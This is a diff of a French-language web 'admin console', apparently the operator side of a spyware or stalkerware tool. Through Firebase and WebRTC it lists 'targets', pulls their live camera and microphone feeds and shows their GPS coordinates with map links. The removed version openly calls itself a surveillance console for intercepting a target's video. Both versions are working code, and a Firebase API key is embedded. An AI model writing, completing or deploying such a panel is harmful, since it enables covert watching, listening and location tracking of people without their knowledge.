@@ -3,115 +3,50 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Console Admin - WebRTC Receiver</title>
+    <title>Console Admin WebRTC</title>
     <script src="https://cdn.tailwindcss.com"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;600;700&display=swap" rel="stylesheet">
     <style>
-        body { font-family: 'Inter', sans-serif; }
-        @keyframes pulse-red {
-            0%, 100% { opacity: 1; }
-            50% { opacity: 0.4; }
-        }
-        .live-pulse { animation: pulse-red 1s infinite; }
+        .log-box { font-family: 'Courier New', monospace; font-size: 12px; height: 150px; overflow-y: auto; background: #000; color: #00ff00; padding: 10px; border-radius: 8px; }
     </style>
 </head>
-<body class="bg-slate-950 text-slate-100 min-h-screen p-4 md:p-8">
+<body class="bg-slate-950 text-slate-100 min-h-screen p-6">
 
-    <div class="max-w-6xl mx-auto space-y-6">
+    <div class="max-w-6xl mx-auto grid grid-cols-1 lg:grid-cols-3 gap-6">
         
-        <!-- En-tête de la Console -->
-        <div class="flex flex-col md:flex-row md:items-center justify-between p-6 bg-slate-900 border border-slate-800 rounded-3xl shadow-xl gap-4">
-            <div>
-                <h1 class="text-2xl md:text-3xl font-bold bg-gradient-to-r from-indigo-400 to-purple-400 bg-clip-text text-transparent flex items-center gap-2">
-                    <span>🎥</span> Console de Surveillance WebRTC
-                </h1>
-                <p class="text-slate-400 text-sm mt-1">Interception directe et fluide du flux vidéo de la cible</p>
+        <!-- Colonne Gauche -->
+        <div class="space-y-6">
+            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800 shadow-xl">
+                <h2 class="text-lg font-bold mb-4">👤 Cibles Détectées</h2>
+                <select id="userSelect" class="w-full bg-slate-950 border border-slate-800 rounded-lg p-3 text-sm mb-4">
+                    <option value="">-- Choisir une cible --</option>
+                </select>
+                <div class="grid grid-cols-2 gap-2">
+                    <button id="connectBtn" class="bg-indigo-600 hover:bg-indigo-500 py-2 rounded-lg font-bold text-xs">🔗 Se connecter</button>
+                    <button id="stopBtn" class="bg-red-900 hover:bg-red-800 py-2 rounded-lg font-bold text-xs">⏹️ Arrêter</button>
+                </div>
+                <button id="audioBtn" class="w-full mt-2 bg-emerald-700 hover:bg-emerald-600 py-2 rounded-lg font-bold text-xs">🔊 Activer l'Audio</button>
             </div>
-            <div id="connectionStatus" class="px-4 py-2 bg-slate-950 border border-slate-800 rounded-2xl text-xs font-semibold text-slate-400 flex items-center gap-2">
-                <span class="w-2.5 h-2.5 rounded-full bg-slate-600" id="statusDot"></span>
-                <span id="statusText">En attente de connexion</span>
+
+            <div id="gpsBox" class="bg-slate-900 p-6 rounded-2xl border border-slate-800">
+                <h3 class="text-sm font-semibold text-slate-400 mb-2">📍 Coordonnées GPS</h3>
+                <div id="gpsData" class="text-xs font-mono text-slate-300">Aucune donnée</div>
+            </div>
+
+            <div class="bg-slate-900 p-6 rounded-2xl border border-slate-800">
+                <h3 class="text-sm font-semibold text-slate-400 mb-2">💾 Logs de Connexion WebRTC</h3>
+                <div id="logsConsole" class="log-box"></div>
             </div>
         </div>
 
-        <div class="grid grid-cols-1 lg:grid-cols-3 gap-6">
-            
-            <div class="space-y-6 lg:col-span-1">
-                <!-- Sélecteur de Cibles Actives -->
-                <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl">
-                    <h2 class="text-sm font-semibold text-slate-400 mb-4 uppercase tracking-wider">👤 Cibles Détectées</h2>
-                    <div class="space-y-4">
-                        <div>
-                            <label class="block text-xs text-slate-500 mb-2 font-semibold">Choisir un émetteur actif :</label>
-                            <select id="userSelect" class="w-full bg-slate-950 text-slate-300 border border-slate-800 rounded-xl p-3 text-sm focus:outline-none focus:border-indigo-500 transition-all font-medium font-mono">
-                                <option value="">-- Attente de cibles --</option>
-                            </select>
-                        </div>
-                    </div>
-                </div>
-
-                <!-- Panneau GPS en temps réel -->
-                <div id="userInfo" class="hidden bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl space-y-4">
-                    <h3 class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📍 Coordonnées GPS</h3>
-                    <div id="gpsData" class="space-y-3 text-sm">
-                        <!-- Rempli par Firebase -->
-                    </div>
-                </div>
-
-                <!-- Logs de Connexion -->
-                <div class="bg-slate-900 border border-slate-800 p-6 rounded-3xl shadow-xl flex flex-col h-64">
-                    <h3 class="text-sm font-semibold text-slate-400 mb-3 uppercase tracking-wider">💾 Logs de Connexion WebRTC</h3>
-                    <div id="connectionLog" class="flex-1 bg-slate-950 border border-slate-800 rounded-xl p-3 text-[10px] font-mono text-cyan-400 overflow-y-auto space-y-1">
-                        <!-- Rempli par JS -->
-                    </div>
-                </div>
-            </div>
-
-            <div class="lg:col-span-2 space-y-4">
-                <div class="bg-slate-900 border border-slate-800 rounded-3xl p-4 shadow-xl flex flex-col">
-                    <div class="flex items-center justify-between mb-3 px-2">
-                        <span class="text-sm font-semibold text-slate-400 uppercase tracking-wider">📺 Flux Caméra Temps Réel</span>
-                        <div class="flex items-center gap-3 text-xs text-slate-500">
-                            <span id="metaState">Inactif</span>
-                        </div>
-                    </div>
-
-                    <!-- Lecteur Vidéo WebRTC -->
-                    <div class="relative bg-slate-950 aspect-video rounded-2xl overflow-hidden border border-slate-850 flex items-center justify-center min-h-[350px]">
-                        <div id="placeholderText" class="absolute flex flex-col items-center justify-center text-slate-600 p-6 text-center">
-                            <span class="text-5xl mb-3">📡</span>
-                            <p class="text-sm font-medium">Sélectionnez un appareil en ligne à gauche, puis cliquez sur "Se connecter".</p>
-                        </div>
-                        <video id="remoteVideo" autoplay playsinline class="hidden w-full h-full object-contain"></video>
-                        <!-- Badge d'écoute du microphone cible -->
-                        <div id="audioStatusBadge" class="hidden absolute top-3 right-3 bg-emerald-600 text-white text-[10px] font-bold px-2.5 py-1 rounded-full items-center gap-1.5 shadow-lg z-20">
-                            <span class="w-1.5 h-1.5 rounded-full bg-white animate-pulse"></span>
-                            🔊 MICROPHONE ACTIF
-                        </div>
-                    </div>
-
-                    <!-- Commandes administratives -->
-                    <div class="grid grid-cols-2 sm:grid-cols-4 gap-3 mt-4">
-                        <button id="connectBtn" class="py-3 px-4 bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-bold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            🔗 Se connecter
-                        </button>
-                        <button id="toggleAudioBtn" disabled class="py-3 px-4 bg-emerald-800 hover:bg-emerald-700 text-emerald-100 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            🔊 Activer Audio
-                        </button>
-                        <button id="disconnectBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-red-900 hover:text-white text-slate-400 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            ⏹️ Arrêter
-                        </button>
-                        <button id="fullscreenBtn" disabled class="py-3 px-4 bg-slate-800 hover:bg-slate-700 text-slate-300 text-xs font-semibold rounded-xl transition-all disabled:opacity-30 disabled:pointer-events-none col-span-1">
-                            🖥️ Plein écran
-                        </button>
-                    </div>
-                </div>
-            </div>
+        <!-- Colonne Droite (Vidéo) -->
+        <div class="lg:col-span-2 space-y-4">
+            <video id="remoteVideo" autoplay playsinline muted class="w-full aspect-video bg-black rounded-2xl border border-slate-700 shadow-2xl"></video>
         </div>
     </div>
 
     <script type="module">
         import { initializeApp } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-app.js";
-        import { getDatabase, ref, onValue, off, set, push, get, remove } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
+        import { getDatabase, ref, onValue, set, push } from "https://www.gstatic.com/firebasejs/11.0.0/firebase-database.js";
 
         const firebaseConfig = {
             apiKey: "AIzaSyCiTlZ2IyY-y4vOHi0zrvHsp-Ro95wzFaU",
@@ -126,346 +61,81 @@
 
         const app = initializeApp(firebaseConfig);
         const database = getDatabase(app);
-
-        let currentUserId = null;
-        let peerConnection = null;
-        let locationListenerRef = null;
-        let candidatesListenerRef = null;
-        let candidateQueue = [];
-
-        const remoteVideo = document.getElementById('remoteVideo');
-        const placeholderText = document.getElementById('placeholderText');
-        const connectBtn = document.getElementById('connectBtn');
-        const toggleAudioBtn = document.getElementById('toggleAudioBtn');
-        const disconnectBtn = document.getElementById('disconnectBtn');
-        const fullscreenBtn = document.getElementById('fullscreenBtn');
-        const debugBtn = document.getElementById('debugBtn');
-        const userSelect = document.getElementById('userSelect');
-        const userInfoDiv = document.getElementById('userInfo');
-        const gpsDataDiv = document.getElementById('gpsData');
-        const connectionLog = document.getElementById('connectionLog');
-
-        const statusDot = document.getElementById('statusDot');
-        const statusText = document.getElementById('statusText');
-        const metaState = document.getElementById('metaState');
-
-        const rtcConfig = {
-            iceServers: [
-                { urls: 'stun:stun.l.google.com:19302' },
-                { urls: 'stun:stun1.l.google.com:19302' },
-                { urls: 'stun:stun2.l.google.com:19302' }
-            ]
-        };
-
-        function addLog(message) {
-            const time = new Date().toLocaleTimeString();
-            connectionLog.innerHTML = `<p>[${time}] ${message}</p>` + connectionLog.innerHTML;
-        }
-
-        function setSystemStatus(message, state = 'idle') {
-            statusText.innerText = message;
-            statusDot.className = "w-2.5 h-2.5 rounded-full";
-            
-            if (state === 'live') {
-                statusDot.classList.add('bg-red-500', 'live-pulse');
-            } else if (state === 'pending') {
-                statusDot.classList.add('bg-amber-500');
-            } else {
-                statusDot.classList.add('bg-slate-600');
-            }
-        }
-
-        // Système intelligent de catégorisation en direct et hors ligne
-        function loadUsers() {
-            const usersRef = ref(database, 'users');
-            onValue(usersRef, (snapshot) => {
-                const users = snapshot.val();
-                const previousSelection = userSelect.value;
-                const now = Date.now();
-                
-                const activeLive = [];
-                const activeIdle = [];
-                const offline = [];
-
-                if (users) {
-                    Object.keys(users).forEach(userId => {
-                        const userObj = users[userId];
-                        const lastActiveTime = userObj.lastActive || userObj.timestamp || 0;
-                        const userDevice = userObj.device || "📱 Appareil";
-                        const isConnected = (now - lastActiveTime) < 8000;
-                        
-                        if (!isConnected) {
-                            offline.push({ id: userId, device: userDevice, lastSeen: lastActiveTime });
-                        } else if (userObj.active === true) {
-                            activeLive.push({ id: userId, device: userDevice });
-                        } else {
-                            activeIdle.push({ id: userId, device: userDevice });
-                        }
-                    });
-                }
-
-                let selectHTML = '<option value="">-- Choisir une cible --</option>';
-
-                if (activeLive.length > 0) {
-                    selectHTML += `<optgroup label="🟢 EN DIRECT (PARTAGE WEBRTC ACTIF)">`;
-                    activeLive.forEach(user => {
-                        const isSelected = (user.id === previousSelection) ? 'selected' : '';
-                        selectHTML += `<option value="${user.id}" ${isSelected}>🟢 [LIVE] Cible #${user.id} (${user.device})</option>`;
-                    });
-                    selectHTML += `</optgroup>`;
-                }
-
-                if (activeIdle.length > 0) {
-                    selectHTML += `<optgroup label="🟡 EN LIGNE (ATTENTE)">`;
-                    activeIdle.forEach(user => {
-                        const isSelected = (user.id === previousSelection) ? 'selected' : '';
-                        selectHTML += `<option value="${user.id}" ${isSelected}>🟡 [ATTENTE] Cible #${user.id} (${user.device})</option>`;
-                    });
-                    selectHTML += `</optgroup>`;
-                }
-
-                if (offline.length > 0) {
-                    selectHTML += `<optgroup label="⚫ HORS LIGNE (INACTIF)">`;
-                    offline.forEach(user => {
-                        const isSelected = (user.id === previousSelection) ? 'selected' : '';
-                        const timeString = user.lastSeen ? new Date(user.lastSeen).toLocaleTimeString() : 'Inconnue';
-                        selectHTML += `<option value="${user.id}" ${isSelected}>⚫ [INACTIF] Cible #${user.id} (Dernier contact : ${timeString})</option>`;
-                    });
-                    selectHTML += `</optgroup>`;
-                }
-
-                if (activeLive.length === 0 && activeIdle.length === 0 && offline.length === 0) {
-                    selectHTML = '<option value="">-- Aucun utilisateur détecté --</option>';
-                }
-
-                userSelect.innerHTML = selectHTML;
-            });
-        }
-
-        function loadUserInfo(userId) {
-            if (locationListenerRef) off(locationListenerRef);
-
-            locationListenerRef = ref(database, `users/${userId}/location`);
-            onValue(locationListenerRef, (snapshot) => {
-                const location = snapshot.val();
-                if (location) {
-                    userInfoDiv.style.display = 'block';
-                    gpsDataDiv.innerHTML = `
-                        <div class="space-y-1">
-                            <span class="text-xs text-slate-500 block">Latitude</span>
-                            <span class="font-mono text-slate-200 font-bold">${location.lat}</span>
-                        </div>
-                        <div class="space-y-1">
-                            <span class="text-xs text-slate-500 block">Longitude</span>
-                            <span class="font-mono text-slate-200 font-bold">${location.lng}</span>
-                        </div>
-                        <div class="pt-2">
-                            <a href="https://www.google.com/maps?q=${location.lat},${location.lng}" 
-                               target="_blank" class="w-full inline-block text-center py-2 px-4 bg-indigo-500/10 hover:bg-indigo-500/20 text-indigo-400 font-semibold rounded-xl text-xs transition-all">
-                                🗺️ Ouvrir dans Google Maps
-                            </a>
-                        </div>
-                        <div class="text-[10px] text-slate-500 text-right pt-1">
-                            Mis à jour : ${new Date(location.timestamp).toLocaleTimeString()}
-                        </div>
-                    `;
-                } else {
-                    userInfoDiv.style.display = 'none';
-                }
-            });
-        }
-
-        // Connexion WebRTC : Prise d'offre, envoi de réponse, synchronisation ICE Candidates
-        async function connectToUser() {
-            currentUserId = userSelect.value;
-            if (!currentUserId) {
-                setSystemStatus("⚠️ Choisissez une cible", "pending");
-                addLog("⚠️ Erreur : aucun utilisateur sélectionné.");
-                return;
-            }
-
-            disconnect();
-            currentUserId = userSelect.value;
-            
-            setSystemStatus("🔄 Connexion...", "pending");
-            connectBtn.disabled = true;
-            disconnectBtn.disabled = false;
-            
-            addLog(`🔍 Demande du flux WebRTC pour la cible #${currentUserId}...`);
-
-            try {
-                // Étape 1 : Récupérer l'offre SDP de l'utilisateur
-                const offerRef = ref(database, `webrtc/${currentUserId}/offer`);
-                const offerSnapshot = await get(offerRef);
-                const offer = offerSnapshot.val();
-
-                if (!offer) {
-                    addLog("❌ Impossible de se connecter : Aucune offre WebRTC disponible. La cible doit activer la diffusion.");
-                    setSystemStatus("❌ Aucun signal", "idle");
-                    connectBtn.disabled = false;
-                    disconnectBtn.disabled = true;
-                    return;
-                }
-
-                // Étape 2 : Créer le PeerConnection local
-                peerConnection = new RTCPeerConnection(rtcConfig);
-                candidateQueue = [];
-
-                peerConnection.onconnectionstatechange = () => {
-                    metaState.innerText = peerConnection.connectionState.toUpperCase();
-                    addLog(`Statut de liaison : ${peerConnection.connectionState}`);
-                    if (peerConnection.connectionState === 'connected') {
-                        setSystemStatus("🔴 EN DIRECT", "live");
-                        fullscreenBtn.disabled = false;
-                    }
-                };
-
-                // Capture du flux vidéo et audio entrant
-                peerConnection.ontrack = (event) => {
-                    addLog(`🎬 Liaison du flux actif : ${event.track.kind}`);
-                    placeholderText.style.display = 'none';
-                    remoteVideo.style.display = 'block';
-                    remoteVideo.srcObject = event.streams[0];
-                    
-                    // Par défaut, on mute pour éviter le larsen, l'admin doit activer l'audio via le bouton
-                    remoteVideo.muted = true;
-                    toggleAudioBtn.disabled = false;
-                    toggleAudioBtn.innerText = "🔊 Activer Audio";
-
-                    if (event.track.kind === 'audio') {
-                        document.getElementById('audioStatusBadge').style.display = 'flex';
-                        addLog("🔊 Microphone de la cible détecté.");
-                    }
-                };
-
-                // Envoi des ICE Candidates de l'admin à l'utilisateur
-                peerConnection.onicecandidate = (event) => {
-                    if (event.candidate) {
-                        const candidateRef = ref(database, `webrtc/${currentUserId}/admin-candidates`);
-                        push(candidateRef, event.candidate.toJSON());
-                    }
-                };
-
-                // Définition de la description distante (l'offre de l'utilisateur)
-                await peerConnection.setRemoteDescription(new RTCSessionDescription(offer));
-                addLog("📝 Offre de la cible appliquée avec succès.");
-
-                // Traitement de la file d'attente d'ICE Candidates distants
-                while (candidateQueue.length > 0) {
-                    const candidate = candidateQueue.shift();
-                    await peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
-                }
-
-                // Étape 3 : Création et envoi de la réponse SDP (Answer)
-                const answer = await peerConnection.createAnswer();
-                await peerConnection.setLocalDescription(answer);
-
-                const answerRef = ref(database, `webrtc/${currentUserId}/answer`);
-                await set(answerRef, {
-                    sdp: answer.sdp,
-                    type: answer.type,
-                    timestamp: Date.now()
-                });
-                addLog("📤 Réponse de l'admin transmise.");
-
-                // Étape 4 : Écouter en temps réel les candidats de l'utilisateur
-                const userCandidatesRef = ref(database, `webrtc/${currentUserId}/candidates`);
-                candidatesListenerRef = onValue(userCandidatesRef, (snapshot) => {
-                    const candidates = snapshot.val();
-                    if (candidates) {
-                        Object.values(candidates).forEach(candidate => {
-                            if (peerConnection && peerConnection.currentRemoteDescription) {
-                                peerConnection.addIceCandidate(new RTCIceCandidate(candidate)).catch(e => console.warn(e));
-                            } else {
-                                candidateQueue.push(candidate);
-                            }
-                        });
-                    }
-                });
-
-                loadUserInfo(currentUserId);
-
-            } catch (err) {
-                addLog(`❌ Échec de la connexion WebRTC : ${err.message}`);
-                setSystemStatus("❌ Échec", "idle");
-                disconnect();
-            }
-        }
-
-        function disconnect() {
-            if (candidatesListenerRef) {
-                off(ref(database, `webrtc/${currentUserId}/candidates`));
-                candidatesListenerRef = null;
-            }
-            if (locationListenerRef) {
-                off(locationListenerRef);
-                locationListenerRef = null;
-            }
-            
-            if (peerConnection) {
-                peerConnection.close();
-                peerConnection = null;
-            }
-
-            if (currentUserId) {
-                remove(ref(database, `webrtc/${currentUserId}/answer`));
-                remove(ref(database, `webrtc/${currentUserId}/admin-candidates`));
-            }
-
-            remoteVideo.srcObject = null;
-            remoteVideo.style.display = 'none';
-            document.getElementById('audioStatusBadge').style.display = 'none';
-            placeholderText.style.display = 'flex';
-            userInfoDiv.style.display = 'none';
-            
-            connectBtn.disabled = false;
-            toggleAudioBtn.disabled = true;
-            toggleAudioBtn.innerText = "🔊 Activer Audio";
-            disconnectBtn.disabled = true;
-            fullscreenBtn.disabled = true;
-            
-            metaState.innerText = "INACTIF";
-            setSystemStatus("🔌 Déconnecté", "idle");
-            addLog("🔌 Déconnecté");
-        }
-
-        function toggleAudio() {
-            if (remoteVideo.muted) {
-                remoteVideo.muted = false;
-                toggleAudioBtn.innerText = "🔇 Couper Audio";
-                toggleAudioBtn.classList.replace('bg-emerald-800', 'bg-red-800');
-                addLog("🔊 Audio activé.");
-            } else {
-                remoteVideo.muted = true;
-                toggleAudioBtn.innerText = "🔊 Activer Audio";
-                toggleAudioBtn.classList.replace('bg-red-800', 'bg-emerald-800');
-                addLog("🔇 Audio coupé.");
-            }
-        }
-
-        function toggleFullscreen() {
-            if (!document.fullscreenElement) {
-                remoteVideo.requestFullscreen().catch(err => {
-                    console.error("Erreur plein écran:", err);
-                });
-            } else {
-                document.exitFullscreen();
-            }
-        }
-
-        connectBtn.addEventListener('click', connectToUser);
-        toggleAudioBtn.addEventListener('click', toggleAudio);
-        disconnectBtn.addEventListener('click', disconnect);
-        fullscreenBtn.addEventListener('click', toggleFullscreen);
-        userSelect.addEventListener('change', disconnect);
         
-        debugBtn.addEventListener('click', () => {
-            if (remoteVideo.srcObject) {
-                const stream = remoteVideo.srcObject;
-                addLog(`ℹ️ [DEBUG] Vidéo WebRTC active. Stream ID: ${stream.id}. Pistes : ${stream.getVideoTracks().length}`);
-            } else {
-                addLog(`⚠️ [DEBUG] Aucun flux actif.`);
-            }
+        let pc = null;
+        const userSelect = document.getElementById('userSelect');
+        const logsConsole = document.getElementById('logsConsole');
+        const remoteVideo = document.getElementById('remoteVideo');
+        const audioBtn = document.getElementById('audioBtn');
+
+        function addLog(msg) {
+            const time = new Date().toLocaleTimeString();
+            logsConsole.innerHTML += `[${time}] ${msg}<br>`;
+            logsConsole.scrollTop = logsConsole.scrollHeight;
+        }
+
+        // 1. Détection Cibles
+        function loadUsers() {
+            onValue(ref(database, 'webrtc'), (snapshot) => {
+                const data = snapshot.val();
+                userSelect.innerHTML = '<option value="">-- Choisir une cible --</option>';
+                if(data) {
+                    Object.keys(data).forEach(id => {
+                        const opt = document.createElement('option');
+                        opt.value = id;
+                        opt.textContent = `🟢 [LIVE] Cible #${id}`;
+                        userSelect.appendChild(opt);
+                    });
+                }
+            });
+        }
+
+        // 2. Connexion
+        document.getElementById('connectBtn').addEventListener('click', async () => {
+            const userId = userSelect.value;
+            if(!userId) return addLog("⚠️ Sélectionnez une cible !");
+
+            addLog(`🔍 Demande de flux pour #${userId}...`);
+            pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:stun.l.google.com:19302' }] });
+
+            pc.ontrack = (event) => {
+                remoteVideo.srcObject = event.streams[0];
+                addLog("🎬 Flux vidéo & audio reçu !");
+            };
+
+            pc.onicecandidate = (e) => {
+                if(e.candidate) push(ref(database, `webrtc/${userId}/admin-candidates`), e.candidate.toJSON());
+            };
+
+            // Écoute de l'offre
+            onValue(ref(database, `webrtc/${userId}/offer`), async (snapshot) => {
+                const offer = snapshot.val();
+                if(offer && !pc.currentRemoteDescription) {
+                    await pc.setRemoteDescription(new RTCSessionDescription(offer));
+                    const answer = await pc.createAnswer();
+                    await pc.setLocalDescription(answer);
+                    await set(ref(database, `webrtc/${userId}/answer`), answer);
+                    addLog("📤 Réponse admin transmise.");
+                }
+            });
+
+            // GPS Listener
+            onValue(ref(database, `users/${userId}/location`), (snapshot) => {
+                const loc = snapshot.val();
+                if(loc) document.getElementById('gpsData').innerText = `Lat: ${loc.lat}\nLng: ${loc.lng}`;
+            });
+        });
+
+        // 3. Audio
+        audioBtn.addEventListener('click', () => {
+            remoteVideo.muted = false;
+            remoteVideo.play();
+            addLog("🔊 Audio activé.");
+        });
+
+        document.getElementById('stopBtn').addEventListener('click', () => {
+            if(pc) pc.close();
+            addLog("⏹️ Connexion fermée.");
         });
 
         loadUsers();
